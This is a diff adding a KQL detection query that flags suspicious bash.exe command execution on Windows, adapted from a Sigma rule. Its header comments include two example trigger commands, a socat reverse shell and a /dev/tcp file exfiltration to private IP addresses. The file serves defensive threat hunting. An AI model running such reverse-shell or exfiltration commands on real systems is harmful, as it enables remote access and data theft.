@@ -1,0 +1,19 @@
+// Title: Suspicious Subsystem for Linux Bash.exe
+// Desc: Performs execution of specified file, can be used for defensive evasion.
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/Bash/
+// Ref - https://www.freebuf.com/articles/system/232074.html
+// Ref - https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
+// MITRE: https://attack.mitre.org/techniques/T1202/ (Defense Evasion: Indirect Command Execution)
+// Trigger: bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+// Trigger: bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24' (Exfiltrate data)
+// Severity: medium
+// From: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
+// By: Frankie Li
+// On: 05-05-2023
+DeviceProcessEvents 
+| where ((ProcessCommandLine contains @'bash.exe' and ProcessCommandLine contains @'-c ') 
+    and not ((InitiatingProcessCommandLine contains @'C:\Program Files\Git\post-install.bat' 
+        or InitiatingProcessCommandLine contains @'C:\Program Files (x86)\Git\post-install.bat' 
+        or InitiatingProcessCommandLine contains @'echo /etc/post-install/*.post') 
+        or ProcessCommandLine contains @'echo /etc/post-install/*.post'))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine
